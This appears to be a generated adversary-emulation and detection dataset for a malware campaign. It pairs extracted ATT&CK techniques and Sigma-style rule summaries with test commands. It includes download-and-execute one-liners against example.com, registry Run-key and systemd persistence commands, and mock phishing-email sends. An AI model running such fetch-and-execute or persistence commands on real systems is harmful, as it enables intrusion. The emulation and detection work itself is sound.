extracted_ttps.description: Attacker used PowerShell for persistence via the registry Run key and to retrieve the current user name
Attacker used PowerShell to execute commands and create persistence mechanisms
Detected PowerShell activity via NLP pattern matching
Malware gathers system information like the system hard drive letter and the victim's IP address
Malware uses cloud storage services like OneDrive to retrieve the C2 server address
Malware uses encryption and base64 encoding to obfuscate files and information
Malware collects information about the infected system, including Windows version and username
Malware creates a registry Run key to establish persistence
Malware downloads and executes remote files from a zip archive
Malware modifies the registry to establish persistence

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: Malware sends collected information to the C2 server
Detected Phishing activity via NLP pattern matching
Malware relies on user execution to gain initial access

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: Malware exfiltrates data over the C2 channel
Malware uses OneDrive to host C2 server addresses
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Command and Scripting Interpreter activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected Windows Management Instrumentation activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Registry Run Keys activity via NLP pattern matching

rules.title: Detection: PowerShell
rules.description: Attacker used PowerShell for persistence via the registry Run key and to retrieve the current user name
falsepositives: Legitimate administrative activity

rules.title: Detection of PowerShell Activity via NLP Pattern Matching
rules.description: Detects PowerShell activity using specific command line arguments and process name
falsepositives: Legitimate system administration tasks
Development and testing activities

rules.title: System Information Discovery
rules.description: Detects system information discovery techniques using command-line tools
falsepositives: Administrators or power users using command-line tools for legitimate purposes
Scripted automated tasks using system information discovery tools

rules.title: Suspicious PowerShell Download from OneDrive with Encoding Flags
rules.description: Detects PowerShell processes that download content from OneDrive using the known malicious URL and include typical encoding flags, indicating possible C2 retrieval via cloud storage.
falsepositives: Legitimate administrative scripts that download installers or updates from OneDrive using PowerShell with encoding flags.
Automated deployment or CI/CD pipelines that pull artifacts from OneDrive.

rules.title: Obfuscated Files or Information via Base64 or XOR in Command Lines
rules.description: Detects execution of PowerShell or CertUtil commands that indicate use of base64 encoding or XOR obfuscation, such as PowerShell -EncodedCommand, presence of "base64" or "xor" in arguments, and CertUtil -decode usage.

detection.condition: selection1 or selection2 or selection3 or selection4

falsepositives: Legitimate administrative scripts using PowerShell -EncodedCommand for automation
System administrators using CertUtil to decode certificates or files
Developers testing base64 encoding/decoding in PowerShell scripts

rules.title: Application Window Discovery via System Information Commands
rules.description: Detects processes that execute commands commonly used to discover Windows version or logged‑in user information, such as systeminfo, ver, whoami, query user, or qwinsta, especially when launched from Explorer.

detection.condition: (selection_version_systeminfo or selection_version_ver or selection_user_whoami or selection_user_query or selection_user_qwinsta) and parent_explorer

falsepositives: System administrators running systeminfo or whoami for troubleshooting
Scripts that collect environment information during legitimate software deployment
User manually checking OS version via cmd or PowerShell

rules.title: Modify Registry via Suspicious Interpreters
rules.description: Detects malware creating a registry Run key to establish persistence using suspicious interpreters
falsepositives: Legitimate applications using php-cgi or other interpreters to access the registry
Administrative scripts using python or perl to configure the system

rules.title: Ingress Tool Transfer via Download and Execution of mal_1.exe
rules.description: Detects processes that download a remote archive from the malicious URL fragment 85.31.231/ archive_path using common download utilities, or execution of the extracted malicious executable mal_1.exe with a suspicious parent process.
falsepositives: Legitimate administrative scripts using PowerShell or certutil to download updates or patches.
System maintenance tasks that extract archives with 7z or PowerShell Expand-Archive.
IT automation that runs mal_1.exe as part of a benign internal tool (unlikely but possible).

rules.title: Suspicious PowerShell Exfiltration to /api/attach over HTTPS
rules.description: Detects PowerShell processes that are likely used to exfiltrate data over a C2 channel by sending HTTPS requests containing the '/api/attach' endpoint, spawned by a typical user process.
falsepositives: Legitimate administrative scripts that use PowerShell to download updates or configuration files over HTTPS.
Security tools or monitoring agents that invoke PowerShell with URLs for health checks.
rules.technique_name: Exfiltration Over Command and Control Channel

rules.title: Phishing: Office Document Spawning PowerShell or Script Host with Encoded Commands
rules.description: Detects Office (WINWORD.EXE) processes spawning PowerShell, cmd, or script host processes with indicators of malicious execution such as encoded PowerShell commands or execution from temporary directories, which are common in phishing payloads.
falsepositives: Legitimate use of PowerShell scripts by administrators
Internal automation macros that invoke script hosts
Software installers that run scripts from temporary directories
User-initiated execution of Office macros for business processes

rules.title: Detection of php-cgi.exe Execution via User Interaction
rules.description: Identify potential initial access via php-cgi.exe execution by users
falsepositives: Legitimate development activities
Administrative tasks involving php-cgi.exe

rules.title: Create or Modify System Process via Suspicious PowerShell or Cmd Execution
rules.description: Detects creation or modification of system processes commonly used for persistence, focusing on PowerShell, cmd.exe, and wscript.exe executions with encoded commands.

detection.condition: selection or selection2 or selection3 or selection4

falsepositives: Legitimate administrative scripts that use PowerShell -EncodedCommand for deployment
Scheduled tasks or startup scripts that invoke PowerShell with Base64 payloads
System maintenance tools that run cmd.exe via services.exe with /c switches

rules.title: Suspicious Use of Command and Scripting Interpreters with Encoded or Base64 Payloads
rules.description: Detects execution of command and scripting interpreter binaries (PowerShell, wscript, cscript, python) when invoked with flags indicating encoded or Base64 payloads, while excluding known admin tools to reduce false positives.

detection.condition: not exclude_admin and ((selection_ps and (enc_flag or enc_flag_short)) or (selection_wscript and base64_flag) or (selection_cscript and base64_flag) or (selection_python and base64_flag))

falsepositives: Administrators using PowerShell with -EncodedCommand for legitimate deployment scripts
Signed scripts executed via wscript.exe or cscript.exe
Automation tools (e.g., SCCM, Ansible) that invoke PowerShell with encoded commands
Python scripts that include Base64 strings for legitimate data handling

rules.title: Suspicious Windows Management Instrumentation (WMI) Execution via wmic.exe or PowerShell
rules.description: Detects execution of WMI commands using wmic.exe or PowerShell WMI cmdlets, especially when launched from Office applications, indicating possible abuse of Windows Management Instrumentation for malicious activity.

detection.condition: (wmic_exe OR wmic_cmd OR wmic_namespace OR wmic_process_call OR powershell_getwmi OR powershell_getcim OR powershell_invokewmi OR (wmic_exe AND office_parent) OR (powershell_getwmi AND office_parent) OR (powershell_getcim AND office_parent) OR (powershell_invokewmi AND office_parent))

falsepositives: Legitimate administrative use of wmic.exe for system queries
Scheduled tasks or scripts that use WMI for inventory collection
Enterprise monitoring tools that invoke PowerShell WMI cmdlets
Authorized Office macros that query WMI for legitimate purposes

rules.title: Archive Collected Data via Common Archiving Utilities
rules.description: Detects creation of archive files using typical command‑line tools or PowerShell Compress‑Archive, indicating possible data collection and exfiltration preparation.
falsepositives: Legitimate backup or maintenance scripts that archive files
System administrators creating archives for deployment
Software installers that bundle resources using archiving tools

rules.title: Detect Registry Run Keys Persistence via Reg.exe and PowerShell
rules.description: Detects creation, modification, or deletion of registry Run keys used for persistence by monitoring reg.exe and PowerShell commands that target HKCU or HKLM Run registry paths.
falsepositives: Legitimate software installers that add entries to Run keys
System updates or patches modifying Run keys
Administrative scripts used by IT staff for configuration management

attacks.command: powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; Add-Type -AssemblyName System.Windows.Forms; [Microsoft.VisualBasic.Interaction]::Shell("cmd /c echo Hello World > %TEMP%\test.txt", 1, False, -1, "Open")"
attacks.description: Basic command that uses PowerShell to execute a simple script that writes to a file in the temp directory
attacks.expected_behavior: A file named test.txt will be created in the temp directory with the contents 'Hello World'

attacks.command: powershell -Command "$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $name = 'Test'; $command = 'cmd /c echo Test > %TEMP%\test.txt'; if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force -ErrorAction SilentlyContinue }; Set-ItemProperty -Path $regPath -Name $name -Value $command -Type String -Force"
attacks.description: Intermediate command that uses PowerShell to interact with the registry and set a run key
attacks.expected_behavior: A run key will be set in the registry to execute the command 'cmd /c echo Test > %TEMP%\test.txt' on startup

attacks.description: Advanced command that uses PowerShell to encode a command and execute it
attacks.expected_behavior: A file named encoded.txt will be created in the temp directory with the encoded command, and then the encoded command will be executed

attacks.description: Basic example of using PowerShell to create a file in the temp directory
attacks.expected_behavior: A file named test.txt will be created in the temp directory with the contents 'Hello World'

attacks.description: Intermediate example of using PowerShell to create a directory and file in the temp directory
attacks.expected_behavior: A directory named test will be created in the temp directory, and a file named test.txt will be created in that directory with the contents 'Hello World'

attacks.command: powershell -Command "& { Start-Process cmd -ArgumentList '/c echo Hello World' }"
attacks.description: Advanced example of using PowerShell to start a new process
attacks.expected_behavior: A new process will be started, and the command 'echo Hello World' will be executed in that process

attacks.description: This command uses PowerShell to list all running processes on the system, demonstrating basic execution capability.
attacks.expected_behavior: Lists all running processes without modifying the system.

attacks.description: This command demonstrates intermediate use by creating a file in the temp directory using PowerShell, showcasing file system interaction.
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Hello World', overwriting any existing file with the same name.

attacks.description: This advanced command encodes a PowerShell command using Base64, which can then be used with the EncodedCommand parameter, demonstrating more complex scripting capabilities.
attacks.expected_behavior: Encodes the 'Get-Process' command into Base64 format, which can be used for further execution or analysis.

attacks.description: Basic command to get the current date and time
attacks.expected_behavior: The command will print the current date and time to the console.

attacks.description: Intermediate command to create a file in the temporary directory
attacks.expected_behavior: The command will create a file named 'test.txt' in the temporary directory with the content 'Hello World!'.

attacks.description: Advanced command to compress a file in the temporary directory
attacks.expected_behavior: The command will compress the file 'test.txt' in the temporary directory and create a zip file named 'test.zip' in the same directory.

attacks.description: Retrieve IP address and basic network information
attacks.expected_behavior: Displays IP configuration and network settings

attacks.description: Retrieve user privileges and group membership
attacks.expected_behavior: Displays user privileges and group membership

attacks.command: powershell -Command "Get-WmiObject -Class Win32_LogicalDisk | Select-Object -Property DeviceID, Size, FreeSpace"
attacks.description: Retrieve detailed disk information using PowerShell
attacks.expected_behavior: Displays detailed information about logical disks, including device ID, size, and free space

attacks.description: Gather system information
attacks.expected_behavior: The command will output system information like the kernel version, hostname, and operating system.

attacks.description: Gather the victim's IP address
attacks.expected_behavior: The command will output the victim's IP address and other network information.

attacks.description: Gather system information and the victim's IP address
attacks.expected_behavior: The command will output both system information and the victim's IP address.

attacks.description: Simulate downloading a C2 server address from a hypothetical cloud storage service using PowerShell.
attacks.expected_behavior: A file named c2.txt will be downloaded from the specified URL to the user's temp directory, simulating the retrieval of a C2 server address.

attacks.description: Use certutil to download a file from a URL, simulating the retrieval of a C2 server address from a cloud storage service.
attacks.expected_behavior: The file c2.txt will be downloaded from the specified URL to the user's temp directory, demonstrating an alternative method to PowerShell for achieving the same goal.

attacks.description: Create a local file with a C2 server address and then open it, simulating the exploitation of a public-facing application by accessing the C2 server address.
attacks.expected_behavior: A file named c2.txt will be created in the temp directory with the specified C2 server address, and then the default associated application will attempt to open this file, demonstrating a basic exploitation scenario.

attacks.description: Simulate fetching a C2 server address from a cloud storage service and executing it.
attacks.expected_behavior: The command fetches a file from a specified URL, saves it to a hidden file in the user's home directory, and then executes it with bash. This demonstrates how an attacker might use a public-facing application to retrieve and execute malicious code.

attacks.description: Simulate downloading a malicious script from a cloud storage service, making it executable, and then running it.
attacks.expected_behavior: This command downloads a script from a specified URL, saves it to a hidden file in the user's home directory, makes the file executable, and then executes it. This demonstrates another way an attacker might exploit a public-facing application to execute malicious code on a Linux system.

attacks.description: Simulate storing a C2 server URL in a file, then using that URL to fetch and execute malicious code.
attacks.expected_behavior: This command first stores a URL in a hidden file, then uses curl to fetch content from that URL, saving it to another file, and finally executes the fetched content with bash. This demonstrates a more complex scenario of exploiting a public-facing application for initial access.

attacks.description: Encode a file using certutil
attacks.expected_behavior: The file test.txt will be encoded and saved as encoded.txt in the temp directory.

attacks.description: Decode a base64 encoded string using PowerShell and save it to a file
attacks.expected_behavior: The base64 encoded string will be decoded and saved to the file decoded.txt in the temp directory.

attacks.description: Obfuscate a file by compressing it twice with different compression levels
attacks.expected_behavior: The file test.txt will be compressed twice, resulting in an obfuscated zip file named obfuscated.zip in the temp directory.

attacks.description: Basic command to encode a string using base64
attacks.expected_behavior: The command will output the base64 encoded string of 'Hello World'

attacks.description: Intermediate command to encrypt a file using AES-256-CBC
attacks.expected_behavior: The command will encrypt the file 'file.txt' and output the encrypted file 'file.enc'

attacks.command: echo 'Hello World' | base64 | openssl enc -aes-256-cbc -out file.enc
attacks.description: Advanced command to encode a string using base64 and then encrypt it using AES-256-CBC
attacks.expected_behavior: The command will output the base64 encoded string of 'Hello World' and then encrypt it using AES-256-CBC, saving the result to 'file.enc'

attacks.description: Get the Windows version
attacks.expected_behavior: The command will output the Windows version

attacks.description: Get the current username
attacks.expected_behavior: The command will output the current username

attacks.description: Get the Windows version using PowerShell
attacks.expected_behavior: The command will output the Windows version

attacks.description: This command prints the current desktop session, providing information about the graphical environment.
attacks.expected_behavior: Outputs the name of the desktop session (e.g., gnome, kde, etc.)

attacks.description: This command displays information about the window manager, including its name and version.
attacks.expected_behavior: Outputs details about the current window manager

attacks.description: This command filters environment variables to find those related to the desktop session, providing more detailed information about the graphical environment.
attacks.expected_behavior: Outputs environment variables containing session or desktop information

attacks.description: Add a new registry key to the Run folder using reg.exe
attacks.expected_behavior: A new registry key is added to the Run folder, which will execute cmd.exe upon user login.

attacks.description: Add a new registry key to the Run folder using PowerShell
attacks.expected_behavior: A new registry key is added to the Run folder, which will execute cmd.exe upon user login.

attacks.description: Add a new registry key to the Run folder that points to a batch file in the AppData directory
attacks.expected_behavior: A new registry key is added to the Run folder, which will execute the test.bat file in the AppData directory upon user login.

attacks.description: Add a cron job to run every minute, writing to a file in /tmp
attacks.expected_behavior: A file named test.txt will be created or updated in /tmp every minute with the content 'TEST'

attacks.description: Add a cron job to run on system reboot, writing to a file in /tmp
attacks.expected_behavior: On the next system reboot, a file named test.txt will be created or updated in /tmp with the content 'TEST'

attacks.command:
sudo bash -c 'echo "[Unit]
Description=Test Service
[Service]
ExecStart=/bin/bash -c "echo TEST > /tmp/test.txt"
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/test.service; sudo systemctl daemon-reload; sudo systemctl enable test.service'
attacks.description: Create a systemd service to run a command on system boot
attacks.expected_behavior: On the next system reboot, a file named test.txt will be created or updated in /tmp with the content 'TEST', demonstrating persistence via a systemd service

attacks.description: Downloads a zip archive from a remote URL and extracts it to %TEMP% using certutil and PowerShell.
attacks.expected_behavior: Downloads and extracts the zip archive to %TEMP% without executing any files.

attacks.description: Downloads an executable from a remote URL using PowerShell and then executes it.
attacks.expected_behavior: Downloads and executes the remote executable, potentially leading to malicious activity.

attacks.description: Downloads a text file containing PowerShell commands from a remote URL and executes them using Invoke-Expression.
attacks.expected_behavior: Downloads and executes the PowerShell commands in the text file, potentially leading to malicious activity.

attacks.command: wget http://example.com/tools.zip && unzip tools.zip && bash tools/script.sh
attacks.description: Downloads a zip file, extracts it, and executes a script from the extracted files
attacks.expected_behavior: Downloads a zip file, extracts it, and executes a script from the extracted files

attacks.command: curl -O http://example.com/tools.zip && unzip tools.zip && bash tools/script.sh
attacks.description: Downloads a zip file using curl, extracts it, and executes a script from the extracted files
attacks.expected_behavior: Downloads a zip file, extracts it, and executes a script from the extracted files

attacks.description: Downloads a zip file quietly, extracts it to a temporary directory, and executes a script from the extracted files
attacks.expected_behavior: Downloads a zip file, extracts it to a temporary directory, and executes a script from the extracted files

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic command to encode a test string using certutil and simulate sending it over a C2 channel
attacks.expected_behavior: Creates a test file, encodes it, and prints the encoded content to simulate exfiltration

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate command using PowerShell to simulate sending a file over a C2 channel
attacks.expected_behavior: Creates a test file, then simulates sending it by copying its content to another file

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced command that encodes a test string to Base64 and simulates exfiltration by saving it to a file
attacks.expected_behavior: Encodes a test string to Base64 and saves it to a file, simulating data exfiltration

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic command to simulate sending collected data over a command and control channel using netcat.
attacks.expected_behavior: Sends the string 'Test Data' to a local listener on port 8080, simulating exfiltration.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate command that reads a system file and sends its contents over the command and control channel.
attacks.expected_behavior: Sends the contents of /etc/hosts to a local listener on port 8080, demonstrating data exfiltration.

attacks.technique_name: Exfiltration Over Command and Control Channel

attacks.expected_behavior: Sends a combination of test data and system version information to a local listener on port 8080, simulating sophisticated exfiltration.

attacks.command: echo "This is a phishing simulation" > %TEMP%\phish.txt && start %TEMP%\phish.txt
attacks.description: Creates a text file in the temp directory with a phishing simulation message and opens it, simulating a basic phishing attempt.
attacks.expected_behavior: A text file opens displaying a phishing simulation message.

attacks.description: Downloads an HTML file from a specified URL (which should be a benign example for testing) to the temp directory and opens it, simulating an intermediate phishing attempt via PowerShell.
attacks.expected_behavior: An HTML file opens in the default browser, simulating a phishing page.

attacks.description: Uses certutil to download a PDF file from a specified URL (should be a test file) to the temp directory and opens it, simulating an advanced phishing attempt using a legacy binary.
attacks.expected_behavior: A PDF file opens, displaying its contents, simulating a phishing document.

attacks.command: echo 'This is a test phishing email.' > phishing_email.txt; mail -s 'Test Email' user@example.com < phishing_email.txt
attacks.description: Basic phishing email simulation using echo and mail commands.
attacks.expected_behavior: A text file named phishing_email.txt is created in the current directory, and an email with the content of this file is sent to the specified email address.

attacks.command: echo 'You have won a prize. Click here to claim: https://example.com' > phishing_email_advanced.txt; mail -s 'You Won!' user@example.com < phishing_email_advanced.txt
attacks.description: Intermediate phishing email simulation with a mock malicious link.
attacks.expected_behavior: A text file named phishing_email_advanced.txt is created, and an email with this content, including a benign link, is sent to the specified email address.

attacks.command: echo 'Your account has been compromised. Reset your password here: https://example.com/reset' > phishing_email_advanced2.txt; mail -s 'Account Compromised' user@example.com < phishing_email_advanced2.txt
attacks.description: Advanced phishing email simulation with a sense of urgency.
attacks.expected_behavior: A text file named phishing_email_advanced2.txt is created, and an email with this content, including a benign link and a sense of urgency, is sent to the specified email address.

attacks.expected_behavior: Creates a tar archive of files found by the find command

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "cmd.exe /c echo Test string >> %TEMP%\test.log" /f
attacks.description: Adds a new key to the Run registry using reg.exe, executing a command that appends a test string to a log file in the temp directory. Requires admin privileges.
attacks.expected_behavior: A new registry key is added under HKCU\Software\Microsoft\Windows\CurrentVersion\Run, which executes the specified command at user login.

attacks.command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "cmd.exe /c echo Test string >> %TEMP%\test.log" /f
attacks.description: Similar to the first command but targets the local machine registry, affecting all users. This requires admin privileges and poses a slightly higher safety risk due to its broader impact.
attacks.expected_behavior: A new registry key is added under HKLM\Software\Microsoft\Windows\CurrentVersion\Run, executing the specified command at system startup for all users.

attacks.description: Achieves the same persistence goal using PowerShell, adding a new property to the Run registry key. This command also requires admin privileges and is considered safe as it uses a benign test string.
attacks.expected_behavior: Adds a new property to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key, which executes the specified command at user login.

attacks.description: Appends a command to the system's rc.local file for execution on startup.
attacks.expected_behavior: The command will be executed on the next system startup.

attacks.description: Adds a cron job to execute a command on system reboot.
attacks.expected_behavior: The command will be executed on the next system reboot.

attacks.description: Creates a desktop entry in the user's autostart directory to execute a command on user login.
